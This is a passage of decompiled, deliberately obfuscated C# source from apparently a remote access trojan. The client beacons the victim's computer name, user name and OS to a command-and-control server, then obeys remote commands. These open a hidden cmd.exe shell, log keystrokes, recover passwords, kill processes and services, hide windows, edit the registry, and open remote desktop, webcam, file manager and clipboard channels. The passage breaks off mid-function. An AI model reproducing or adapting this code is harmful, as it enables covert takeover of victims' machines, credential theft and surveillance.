					try
					{
						Thread thread2 = new Thread(eNGP4NGermMaBn184);
						thread2.Start(true);
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					break;
				case "/INSTALLK/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread = new Thread(Bfguvp2VlpRE5p181);
						thread.Start(text);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					break;
				default:
					uqpHzbxjkt122(1);
					try
					{
						SgSByH0l3MEab125.WriteLine("/KEYSLOGG/");
						SgSByH0l3MEab125.Flush();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					break;
				}
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
	}

	private void xEqbeWtnliwltwZcJNYE6205()
	{
		string text = null;
		try
		{
			while (ckmFD5aTnR3097QpXnb7128.Connected)
			{
				text = hEcYx1iJnN4H8zN2nxpF131.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					uqpHzbxjkt122(1);
				}
				string text2 = Strings.Left(text, 10);
				if (Operators.CompareString(text2, "/PSWRECOV/", false) == 0)
				{
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread = new Thread(O1dyb6YapkAQxX9pI143);
						thread.Start(jOYNqbyKN52i1XIQYvOz130);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				else
				{
					uqpHzbxjkt122(1);
					try
					{
						MUXIz59160.WriteLine("/TRYPAAAA/");
						MUXIz59160.Flush();
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	private void xzIaB206()
	{
		string text = null;
		try
		{
			while (TPm01kas9Ftr684eVBAw133.Connected)
			{
				text = streamReader_1.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					uqpHzbxjkt122(1);
				}
				string text2 = Strings.Left(text, 10);
				if (Operators.CompareString(text2, "/LISTPROC/", false) == 0)
				{
					try
					{
						Thread thread = new Thread(mRVAZo0cIl1Q0e0P3161);
						thread.Start();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				else if (Operators.CompareString(text2, "/KILLPROC/", false) == 0)
				{
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread2 = new Thread(Zb0fSxyQ0jxZWW189);
						thread2.Start(text);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				else
				{
					uqpHzbxjkt122(1);
					try
					{
						QyB2pDIjA5KZpJpmNSiL135.WriteLine("/LISTPROC/");
						QyB2pDIjA5KZpJpmNSiL135.Flush();
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}

	private void F27hL207()
	{
		string text = null;
		try
		{
			while (tCWcxwXR3WqONce6P3EM138.Connected)
			{
				text = IIixP4D3Bk58rMi17RYr141.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					uqpHzbxjkt122(1);
				}
				switch (Strings.Left(text, 10))
				{
				case "/LISTSERV/":
					try
					{
						Thread thread6 = new Thread(pBexucqDQTiFi0162);
						thread6.Start();
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STOPSERV/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread5 = new Thread(qRfmLKyDqUFffW172);
						thread5.Start(text + "¦STOP");
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STRTSERV/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread4 = new Thread(qRfmLKyDqUFffW172);
						thread4.Start(text + "¦START");
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
					}
					break;
				case "/DSBLSERV/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread3 = new Thread(qRfmLKyDqUFffW172);
						thread3.Start(text + "¦DISABLE");
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					break;
				case "/MNULSERV/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread2 = new Thread(qRfmLKyDqUFffW172);
						thread2.Start(text + "¦MANUAL");
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					break;
				case "/AUTOSERV/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread = new Thread(qRfmLKyDqUFffW172);
						thread.Start(text + "¦AUTO");
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					break;
				default:
					uqpHzbxjkt122(1);
					try
					{
						u6uEY40dzTkhV1bR7ZGM140.WriteLine("/LISTSERV/");
						u6uEY40dzTkhV1bR7ZGM140.Flush();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					break;
				}
			}
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
	}

	private void m321v208()
	{
		string text = null;
		try
		{
			while (rXBeNbP8JaKg1e282DlZ143.Connected)
			{
				text = streamReader_2.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					uqpHzbxjkt122(1);
				}
				switch (Strings.Left(text, 10))
				{
				case "/REFRWIND/":
					try
					{
						Thread thread3 = new Thread(method_8);
						thread3.Start();
					}
					catch (Exception projectError9)
					{
						ProjectData.SetProjectError(projectError9);
						ProjectData.ClearProjectError();
					}
					break;
				case "/CLSEWIND/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Process processById7 = Process.GetProcessById(Conversions.ToInteger(text));
						processById7.Kill();
						Thread thread2 = new Thread(method_8);
						thread2.Start();
					}
					catch (Exception projectError8)
					{
						ProjectData.SetProjectError(projectError8);
						ProjectData.ClearProjectError();
					}
					break;
				case "/HIDEWIND/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Process processById6 = Process.GetProcessById(Conversions.ToInteger(text));
						ShowWindow(processById6.MainWindowHandle, 0);
						Thread thread = new Thread(method_8);
						thread.Start();
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
					}
					break;
				case "/MINIWIND/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Process processById5 = Process.GetProcessById(Conversions.ToInteger(text));
						ShowWindow(processById5.MainWindowHandle, 6);
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
					}
					break;
				case "/MAXIWIND/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Process processById4 = Process.GetProcessById(Conversions.ToInteger(text));
						ShowWindow(processById4.MainWindowHandle, 3);
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
					}
					break;
				case "/RSTRWIND/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Process processById3 = Process.GetProcessById(Conversions.ToInteger(text));
						ShowWindow(processById3.MainWindowHandle, 9);
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					break;
				case "/DFLTWIND/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Process processById2 = Process.GetProcessById(Conversions.ToInteger(text));
						ShowWindow(processById2.MainWindowHandle, 10);
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SHOWWIND/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Process processById = Process.GetProcessById(Conversions.ToInteger(text));
						ShowWindow(processById.MainWindowHandle, 4);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					break;
				default:
					uqpHzbxjkt122(1);
					try
					{
						streamWriter_0.WriteLine("/REFRWIND/");
						streamWriter_0.Flush();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					break;
				}
			}
		}
		catch (Exception projectError10)
		{
			ProjectData.SetProjectError(projectError10);
			ProjectData.ClearProjectError();
		}
	}

	private void sGLin209()
	{
		string text = null;
		try
		{
			while (i0wwQ8ofQWUnTFBEmOsT148.Connected)
			{
				text = hNSFr3KrWwN20PeIDj20151.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					uqpHzbxjkt122(1);
				}
				switch (Strings.Left(text, 10))
				{
				case "/REGYVIEW/":
					try
					{
						switch (Strings.Mid(text, 11, Strings.Len(text)))
						{
						case "CU":
						{
							Thread thread6 = new Thread(method_12);
							thread6.Start("CU");
							break;
						}
						case "LM":
						{
							Thread thread6 = new Thread(method_12);
							thread6.Start("LM");
							break;
						}
						case "US":
						{
							Thread thread6 = new Thread(method_12);
							thread6.Start("US");
							break;
						}
						}
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
					}
					break;
				case "/REGVIEWS/":
					try
					{
						string text13 = null;
						string text14 = null;
						text = Strings.Mid(text, 11, Strings.Len(text));
						string[] array5 = null;
						array5 = text.Split(new char[1] { '¥' });
						text14 = array5[0];
						text13 = array5[1];
						switch (text14)
						{
						case "CU":
						{
							Thread thread5 = new Thread(DaJvRRYY30MZyO166);
							thread5.Start(text14 + text13);
							break;
						}
						case "LM":
						{
							Thread thread5 = new Thread(DaJvRRYY30MZyO166);
							thread5.Start(text14 + text13);
							break;
						}
						case "US":
						{
							Thread thread5 = new Thread(DaJvRRYY30MZyO166);
							thread5.Start(text14 + text13);
							break;
						}
						}
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
					}
					break;
				case "/REGVIEWV/":
					try
					{
						string text11 = null;
						string text12 = null;
						text = Strings.Mid(text, 11, Strings.Len(text));
						string[] array4 = null;
						array4 = text.Split(new char[1] { '¥' });
						text12 = array4[0];
						text11 = array4[1];
						switch (text12)
						{
						case "CU":
						{
							Thread thread4 = new Thread(OrWSYJUuiyHqTv170);
							thread4.Start(text12 + text11);
							break;
						}
						case "LM":
						{
							Thread thread4 = new Thread(OrWSYJUuiyHqTv170);
							thread4.Start(text12 + text11);
							break;
						}
						case "US":
						{
							Thread thread4 = new Thread(OrWSYJUuiyHqTv170);
							thread4.Start(text12 + text11);
							break;
						}
						}
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
					}
					break;
				case "/REGCREAT/":
					try
					{
						string text8 = null;
						string text9 = null;
						text = Strings.Mid(text, 11, Strings.Len(text));
						string[] array3 = null;
						array3 = text.Split(new char[1] { '¥' });
						text9 = array3[0];
						text8 = array3[1];
						string text10 = array3[2];
						switch (text9)
						{
						case "CU":
						{
							Thread thread3 = new Thread(Tn6KF5XtmhyYTf167);
							thread3.Start(text9 + text8 + "§" + text10);
							break;
						}
						case "LM":
						{
							Thread thread3 = new Thread(Tn6KF5XtmhyYTf167);
							thread3.Start(text9 + text8 + "§" + text10);
							break;
						}
						case "US":
						{
							Thread thread3 = new Thread(Tn6KF5XtmhyYTf167);
							thread3.Start(text9 + text8 + "§" + text10);
							break;
						}
						}
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					break;
				case "/REGDELET/":
					try
					{
						string text5 = null;
						string text6 = null;
						text = Strings.Mid(text, 11, Strings.Len(text));
						string[] array2 = null;
						array2 = text.Split(new char[1] { '¥' });
						text6 = array2[0];
						text5 = array2[1];
						string text7 = array2[2];
						switch (text6)
						{
						case "CU":
						{
							Thread thread2 = new Thread(method_13);
							thread2.Start(text6 + text5 + "§" + text7);
							break;
						}
						case "LM":
						{
							Thread thread2 = new Thread(method_13);
							thread2.Start(text6 + text5 + "§" + text7);
							break;
						}
						case "US":
						{
							Thread thread2 = new Thread(method_13);
							thread2.Start(text6 + text5 + "§" + text7);
							break;
						}
						}
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					break;
				case "/REGRENAM/":
					try
					{
						string text2 = null;
						string text3 = null;
						text = Strings.Mid(text, 11, Strings.Len(text));
						string[] array = null;
						array = text.Split(new char[1] { '¥' });
						text3 = array[0];
						text2 = array[1];
						string text4 = array[2];
						switch (text3)
						{
						case "CU":
						{
							Thread thread = new Thread(rHKqMRvr8QYVla169);
							thread.Start(text3 + text2 + "§" + text4);
							break;
						}
						case "LM":
						{
							Thread thread = new Thread(rHKqMRvr8QYVla169);
							thread.Start(text3 + text2 + "§" + text4);
							break;
						}
						case "US":
						{
							Thread thread = new Thread(rHKqMRvr8QYVla169);
							thread.Start(text3 + text2 + "§" + text4);
							break;
						}
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					break;
				default:
					uqpHzbxjkt122(1);
					try
					{
						EimR8Vj3xjq0KynhQlAT150.WriteLine("/REGYVIEW/");
						EimR8Vj3xjq0KynhQlAT150.Flush();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					break;
				}
			}
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
	}

	private void bDAp5210()
	{
		string text = null;
		try
		{
			while (bS71wo0VkEExizhtJOVX153.Connected)
			{
				text = streamReader_3.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					uqpHzbxjkt122(1);
				}
				switch (Strings.Left(text, 10))
				{
				case "/STARTCMD/":
					try
					{
						if (!GFrwXJ2sLEaWCPUAE144("cmd"))
						{
							JJZ33lEpUnad32 = new Process();
							JJZ33lEpUnad32.StartInfo.FileName = "cmd.exe";
							JJZ33lEpUnad32.StartInfo.CreateNoWindow = true;
							JJZ33lEpUnad32.StartInfo.UseShellExecute = false;
							JJZ33lEpUnad32.StartInfo.RedirectStandardOutput = true;
							JJZ33lEpUnad32.StartInfo.RedirectStandardInput = true;
							JJZ33lEpUnad32.StartInfo.RedirectStandardError = true;
							JJZ33lEpUnad32.OutputDataReceived += JJZ33lEpUnad32_OutputDataReceived;
							JJZ33lEpUnad32.Start();
							JJZ33lEpUnad32.BeginOutputReadLine();
						}
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STOPCMD/":
					try
					{
						Process[] processes = Process.GetProcesses();
						foreach (Process process in processes)
						{
							if (process.ProcessName.StartsWith("cmd"))
							{
								process.Kill();
							}
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					break;
				case "/CMDCMDGO/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Z2rpZswPGBwS33.Append(text);
						Z2rpZswPGBwS33.Append("\r\n");
						JJZ33lEpUnad32.StandardInput.WriteLine((object?)Z2rpZswPGBwS33);
						Z2rpZswPGBwS33.Remove(0, Z2rpZswPGBwS33.Length);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					break;
				}
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}

	private void qnFws211()
	{
		checked
		{
			while (true)
			{
				UZi4a15 = 0;
				Z2rpZswPGBwS33 = new StringBuilder();
				tcpClient_0 = new TcpClient();
				int delayInSeconds = TyGHh1OoS6K2TUZhZ145(5, 25);
				uqpHzbxjkt122(delayInSeconds);
				string text = null;
				string text2 = null;
				try
				{
					if (YkGPBgIzNlz9X0191(string_1))
					{
						text = string_1;
					}
					else
					{
						IPAddress[] hostAddresses = Dns.GetHostAddresses(string_1);
						if (hostAddresses.Length > 1)
						{
							text = hostAddresses[0].ToString();
							try
							{
								if (!YkGPBgIzNlz9X0191(text))
								{
									text = hostAddresses[1].ToString();
								}
							}
							catch (Exception projectError)
							{
								ProjectData.SetProjectError(projectError);
								text = hostAddresses[0].ToString();
								ProjectData.ClearProjectError();
							}
						}
						else
						{
							text = hostAddresses[0].ToString();
						}
					}
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				try
				{
					if (YkGPBgIzNlz9X0191(fys2Z24))
					{
						text2 = fys2Z24;
					}
					else
					{
						IPAddress[] hostAddresses = Dns.GetHostAddresses(fys2Z24);
						if (hostAddresses.Length > 1)
						{
							text2 = hostAddresses[0].ToString();
							try
							{
								if (!YkGPBgIzNlz9X0191(text2))
								{
									text2 = hostAddresses[1].ToString();
								}
							}
							catch (Exception projectError3)
							{
								ProjectData.SetProjectError(projectError3);
								text2 = hostAddresses[0].ToString();
								ProjectData.ClearProjectError();
							}
						}
						else
						{
							text2 = hostAddresses[0].ToString();
						}
					}
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
				try
				{
					tcpClient_0.Connect(text, kX3ha26);
					Tryrp8M3qDof29 = tcpClient_0.GetStream();
					VxHEEbFtIY3B31 = new StreamReader(Tryrp8M3qDof29);
					L7lFgASOP4LW30 = new StreamWriter(Tryrp8M3qDof29);
					UZi4a15 = 0;
					LY5rdd5177 = text;
					Utdb0z920dp9dRMzWd8p4d47178 = kX3ha26;
				}
				catch (Exception projectError5)
				{
					ProjectData.SetProjectError(projectError5);
					try
					{
						try
						{
							tcpClient_0.Connect(text, pbPo527);
							Tryrp8M3qDof29 = tcpClient_0.GetStream();
							VxHEEbFtIY3B31 = new StreamReader(Tryrp8M3qDof29);
							L7lFgASOP4LW30 = new StreamWriter(Tryrp8M3qDof29);
							UZi4a15 = 0;
							LY5rdd5177 = text;
							Utdb0z920dp9dRMzWd8p4d47178 = pbPo527;
						}
						catch (Exception projectError6)
						{
							ProjectData.SetProjectError(projectError6);
							try
							{
								tcpClient_0.Connect(text2, kX3ha26);
								Tryrp8M3qDof29 = tcpClient_0.GetStream();
								VxHEEbFtIY3B31 = new StreamReader(Tryrp8M3qDof29);
								L7lFgASOP4LW30 = new StreamWriter(Tryrp8M3qDof29);
								UZi4a15 = 0;
								LY5rdd5177 = text2;
								Utdb0z920dp9dRMzWd8p4d47178 = kX3ha26;
							}
							catch (Exception projectError7)
							{
								ProjectData.SetProjectError(projectError7);
								try
								{
									tcpClient_0.Connect(text2, pbPo527);
									Tryrp8M3qDof29 = tcpClient_0.GetStream();
									VxHEEbFtIY3B31 = new StreamReader(Tryrp8M3qDof29);
									L7lFgASOP4LW30 = new StreamWriter(Tryrp8M3qDof29);
									UZi4a15 = 0;
									LY5rdd5177 = text2;
									Utdb0z920dp9dRMzWd8p4d47178 = pbPo527;
								}
								catch (Exception projectError8)
								{
									ProjectData.SetProjectError(projectError8);
									method_4();
									Thread.Sleep(100);
									ProjectData.ClearProjectError();
									continue;
								}
								ProjectData.ClearProjectError();
							}
							ProjectData.ClearProjectError();
						}
					}
					catch (Exception projectError9)
					{
						ProjectData.SetProjectError(projectError9);
						Thread.Sleep(100);
						ProjectData.ClearProjectError();
						continue;
					}
					ProjectData.ClearProjectError();
				}
				uqpHzbxjkt122(1);
				try
				{
					string text3 = "Client" + Conversions.ToString(TyGHh1OoS6K2TUZhZ145(1, 99999));
					try
					{
						if (Operators.ConditionalCompareObjectEqual(((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_Registry().get_CurrentUser().OpenSubKey("Software\\Microsoft", writable: false)!.GetValue("Client"), (object)null, false))
						{
							((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_Registry().get_CurrentUser().OpenSubKey("Software\\Microsoft", writable: true)!.SetValue("Client", text3, RegistryValueKind.String);
						}
						else
						{
							text3 = Conversions.ToString(((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_Registry().get_CurrentUser().OpenSubKey("Software\\Microsoft", writable: false)!.GetValue("Client"));
						}
					}
					catch (Exception projectError10)
					{
						ProjectData.SetProjectError(projectError10);
						ProjectData.ClearProjectError();
					}
					if ((Operators.CompareString(text3, (string)null, false) == 0) | (text3.Length < 2))
					{
						text3 = "Client" + Conversions.ToString(TyGHh1OoS6K2TUZhZ145(1, 99999));
					}
					StreamWriter l7lFgASOP4LW = L7lFgASOP4LW30;
					string[] array = new string[12]
					{
						"/TRYFIRST/",
						text3,
						"*",
						((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_Name(),
						"*",
						Environment.UserName,
						"*",
						((ServerComputer)PTvGBbzg8wJXkDlSAlonMk2.Computer).get_Info().get_OSFullName(),
						"*3.6*",
						null,
						null,
						null
					};
					string[] array2 = array;
					string lpszName = "";
					string lpszVer = "";
					array2[9] = Conversions.ToString(capGetDriverDescriptionA(0, ref lpszName, 0, ref lpszVer, 0));
					array[10] = "*";
					array[11] = YUUzZXOziU104();
					l7lFgASOP4LW.WriteLine(string.Concat(array));
					L7lFgASOP4LW30.Flush();
				}
				catch (Exception projectError11)
				{
					ProjectData.SetProjectError(projectError11);
					ProjectData.ClearProjectError();
				}
				while (tcpClient_0.Connected)
				{
					try
					{
						string text4 = VxHEEbFtIY3B31.ReadLine();
						switch (Strings.Left(text4, 10))
						{
						case "/TRYTRYDK/":
							rtsjTeTgv68 = new TcpClient();
							rtsjTeTgv68.Connect(LY5rdd5177, Utdb0z920dp9dRMzWd8p4d47178);
							Qe9NnM2ba69 = rtsjTeTgv68.GetStream();
							qV4kjI6BX71 = new StreamReader(Qe9NnM2ba69);
							isdSfdsAR70 = new StreamWriter(Qe9NnM2ba69);
							OCk5jd1kb72 = new Thread(method_15);
							OCk5jd1kb72.Start();
							isdSfdsAR70.WriteLine("/TRYDESKK/");
							isdSfdsAR70.Flush();
							continue;
						case "/TRYTRYWB/":
							tcpClient_1 = new TcpClient();
							tcpClient_1.Connect(LY5rdd5177, Utdb0z920dp9dRMzWd8p4d47178);
							CydfRjnsl74 = tcpClient_1.GetStream();
							Pc90QV1r376 = new StreamReader(CydfRjnsl74);
							qvUqHLPez75 = new StreamWriter(CydfRjnsl74);
							PdXX8KEu277 = new Thread(TSm1yrSFDIoFd1193);
							PdXX8KEu277.Start();
							qvUqHLPez75.WriteLine("/TRYWEBBB/");
							qvUqHLPez75.Flush();
							continue;
						case "/TRYTRYFM/":
							KyK1HQRAP78 = new TcpClient();
							KyK1HQRAP78.Connect(LY5rdd5177, Utdb0z920dp9dRMzWd8p4d47178);
							gzPfnIwmm79 = KyK1HQRAP78.GetStream();
							nsmaMcI4FOOuj8f581 = new StreamReader(gzPfnIwmm79);
							UCIidqfxf80 = new StreamWriter(gzPfnIwmm79);
							LRezQfqMoKSkslkL82 = new Thread(CCgCvz0G66UkEg194);
							LRezQfqMoKSkslkL82.Start();
							UCIidqfxf80.WriteLine("/TRYFMMMM/");
							UCIidqfxf80.Flush();
							continue;
						case "/TRYTRYIN/":
							aAu7s6NCxj2IxRAt83 = new TcpClient();
							aAu7s6NCxj2IxRAt83.Connect(LY5rdd5177, Utdb0z920dp9dRMzWd8p4d47178);
							scsy1Yp71AM1knCk84 = aAu7s6NCxj2IxRAt83.GetStream();
							streamReader_0 = new StreamReader(scsy1Yp71AM1knCk84);
							t3kID8CF3C2xcIew85 = new StreamWriter(scsy1Yp71AM1knCk84);
							GIeuxSQkzNvoVRUj87 = new Thread(Zjogqr5COKqsOd196);
							GIeuxSQkzNvoVRUj87.Start();
							t3kID8CF3C2xcIew85.WriteLine("/TRYINFOO/");
							t3kID8CF3C2xcIew85.Flush();
							continue;
						case "/TRYTRYMS/":
							mfRWvmrHi8wh2Klh88 = new TcpClient();
							mfRWvmrHi8wh2Klh88.Connect(LY5rdd5177, Utdb0z920dp9dRMzWd8p4d47178);
							kTQuuJZhyyF6glgk89 = mfRWvmrHi8wh2Klh88.GetStream();
							se421qOCgAnWGlrX91 = new StreamReader(kTQuuJZhyyF6glgk89);
							rMv3UlEkhwbomyiO90 = new StreamWriter(kTQuuJZhyyF6glgk89);
							ScPffhmZevdYxAVZ92 = new Thread(Lf6dNCz1fJqklG197);
							ScPffhmZevdYxAVZ92.Start();
							rMv3UlEkhwbomyiO90.WriteLine("/TRYMSGGG/");
							rMv3UlEkhwbomyiO90.Flush();
							continue;
						case "/TRYTRYFN/":
							gRD2hdi1YTNjXHDW93 = new TcpClient();
							gRD2hdi1YTNjXHDW93.Connect(LY5rdd5177, Utdb0z920dp9dRMzWd8p4d47178);
							networkStream_0 = gRD2hdi1YTNjXHDW93.GetStream();
							ShTj4LgdhsacpMO796 = new StreamReader(networkStream_0);
							FoFPHpFETOhmu31w95 = new StreamWriter(networkStream_0);
							O6Dz1OeFyRfULdGO97 = new Thread(DI1ZryGNHDTdbt198);
							O6Dz1OeFyRfULdGO97.Start();
							FoFPHpFETOhmu31w95.WriteLine("/TRYFUNNN/");
							FoFPHpFETOhmu31w95.Flush();
							continue;
						case "/TRYTRYIE/":
							tcpClient_2 = new TcpClient();
							tcpClient_2.Connect(LY5rdd5177, Utdb0z920dp9dRMzWd8p4d47178);
							Z9xnpsv42dLdvmr399 = tcpClient_2.GetStream();
							B8UCFjpALzSK0noL101 = new StreamReader(Z9xnpsv42dLdvmr399);
							Ll989T93vJrzf0q5100 = new StreamWriter(Z9xnpsv42dLdvmr399);
							thread_0 = new Thread(NIeN4t9JqnIvSX199);
							thread_0.Start();
							Ll989T93vJrzf0q5100.WriteLine("/TRYIEEEE/");
							Ll989T93vJrzf0q5100.Flush();
							continue;
						case "/TRYTRYCL/":
							NFCnrPosVzmA1p38103 = new TcpClient();
							NFCnrPosVzmA1p38103.Connect(LY5rdd5177, Utdb0z920dp9dRMzWd8p4d47178);
							lGzLywLvbOBbsKzQ104 = NFCnrPosVzmA1p38103.GetStream();
							rIkkl3ugU6cDddZb106 = new StreamReader(lGzLywLvbOBbsKzQ104);
							KPXkL1ja60YKJn4A105 = new StreamWriter(lGzLywLvbOBbsKzQ104);
							ZwPbsInkmpFxy1LO107 = new Thread(method_17);
							ZwPbsInkmpFxy1LO107.Start();
							KPXkL1ja60YKJn4A105.WriteLine("/TRYCLIPP/");
							KPXkL1ja60YKJn4A105.Flush();
							continue;
						case "/TRYTRYRD/":
							K1JJqeuHlGpEOGWT108 = new TcpClient();
							K1JJqeuHlGpEOGWT108.Connect(LY5rdd5177, Utdb0z920dp9dRMzWd8p4d47178);
							networkStream_1 = K1JJqeuHlGpEOGWT108.GetStream();
							QLjIvGsLwLgyg111 = new StreamReader(networkStream_1);
							WITkoSctfLL18110 = new StreamWriter(networkStream_1);
							SS0oqgyjoYwkq112 = new Thread(xuCgRxUhDhWFJK2NN7MvH201);
							SS0oqgyjoYwkq112.Start();
							WITkoSctfLL18110.WriteLine("/TRYRDDDD/");
							WITkoSctfLL18110.Flush();
							continue;
						case "/TRYTRYPM/":
							NJpL1Ycp1npDu113 = new TcpClient();
							NJpL1Ycp1npDu113.Connect(LY5rdd5177, Utdb0z920dp9dRMzWd8p4d47178);
							htCpWCM7ZktRl114 = NJpL1Ycp1npDu113.GetStream();
							hmRQvBKWY4HZ2116 = new StreamReader(htCpWCM7ZktRl114);
							vtOrMMo4SJmLK115 = new StreamWriter(htCpWCM7ZktRl114);
							TyjNpWTGtJAzA117 = new Thread(ZNMNWcbX374MJvadOdR4N202);
							TyjNpWTGtJAzA117.Start();
							vtOrMMo4SJmLK115.WriteLine("/TRYPMMMM/");
							vtOrMMo4SJmLK115.Flush();
							continue;
						case "/TRYTRYSF/":
							CfpoKfEclpg9P118 = new TcpClient();
							CfpoKfEclpg9P118.Connect(LY5rdd5177, Utdb0z920dp9dRMzWd8p4d47178);
							R6owo7sKTQL5j119 = CfpoKfEclpg9P118.GetStream();
							rkQy82Ez4MhWk121 = new StreamReader(R6owo7sKTQL5j119);
							qR3OCggUYvwAj120 = new StreamWriter(R6owo7sKTQL5j119);
							t7QJpDjqPM8xM122 = new Thread(method_18);
							t7QJpDjqPM8xM122.Start();
							qR3OCggUYvwAj120.WriteLine("/TRYSFFFF/");
							qR3OCggUYvwAj120.Flush();
							continue;
						case "/TRYTRYLG/":
							ZSVTBSW5G7UlH123 = new TcpClient();
							ZSVTBSW5G7UlH123.Connect(LY5rdd5177, Utdb0z920dp9dRMzWd8p4d47178);
							IqJl4MRiN93e6124 = ZSVTBSW5G7UlH123.GetStream();
							oZfNZWoHVTHuH126 = new StreamReader(IqJl4MRiN93e6124);
							SgSByH0l3MEab125 = new StreamWriter(IqJl4MRiN93e6124);
							lFucIREuZGc4z127 = new Thread(z9SSZeRzYTVqUTEIb9YFh204);
							lFucIREuZGc4z127.Start();
							SgSByH0l3MEab125.WriteLine("/TRYKEYYY/");
